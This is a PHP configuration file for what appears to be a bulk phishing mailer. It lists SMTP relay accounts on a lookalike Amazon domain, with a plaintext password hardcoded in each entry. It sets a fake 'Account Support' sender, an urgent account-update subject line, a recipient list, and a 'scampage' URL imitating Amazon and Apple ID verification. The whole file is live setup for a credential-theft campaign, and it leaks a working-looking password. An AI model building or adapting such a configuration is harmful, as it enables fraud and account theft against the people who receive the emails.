<?php

//Regards
date_default_timezone_set('Asia/Jakarta');
$date = date('F d, Y, h:i A T');

/* SMTP SETUP */
$smtp_acc = [
    [
        "host"     => "smtp-relay.gmail.com",
        "port"     => "587",
        "username" => "admin@verify4-amazone.com",
        "password" => "Ademramdani04012000"
    ],
    [
        "host"     => "smtp-relay.gmail.com",
        "port"     => "587",
        "username" => "ade-babacloud@verify4-amazone.com",
        "password" => "Ademramdani04012000"
    ],
    [
        "host"     => "smtp-relay.gmail.com",
        "port"     => "587",
        "username" => "admin@verify4-amazone.com",
        "password" => "Ademramdani04012000"
    ],

];

/* Features SETUP */

$gx_setup = [
    "priority"       => 1,
    "userandom"      => 0,
    "sleeptime"      => 2,
    "replacement"    => 1,
    "filesend"       => 1,
    "userremoveline" => 0,
    "mail_list"      => "file/maillist/tester.txt",
    "fromname"       => "Account Support",
    "frommail"       => "admin##randstring##verify4@verify4-amazone.com.com",
    "subject"        => "Re : [Need Update] [ Alert Information ] Your information need tu be update[FWD]",
    "msgfile"        => "file/letter/ade.txt",
    "filepdf"        => "file/attachment/logo.ico",
    "scampage"       => ["https://verify-identity.amazon.com.info-appleid.com"],
];
